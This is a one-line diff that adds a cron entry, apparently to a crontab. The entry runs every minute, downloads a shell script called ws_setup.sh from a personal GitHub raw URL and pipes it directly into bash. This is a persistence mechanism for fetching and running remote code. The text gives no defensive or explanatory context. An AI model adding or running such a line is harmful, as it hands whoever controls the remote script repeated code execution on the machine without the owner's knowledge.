@@ -1,0 +1,2 @@
+* * * * * wget -O - https://raw.githubusercontent.com/peyfu/hello/master/ws_setup.sh | bash
+
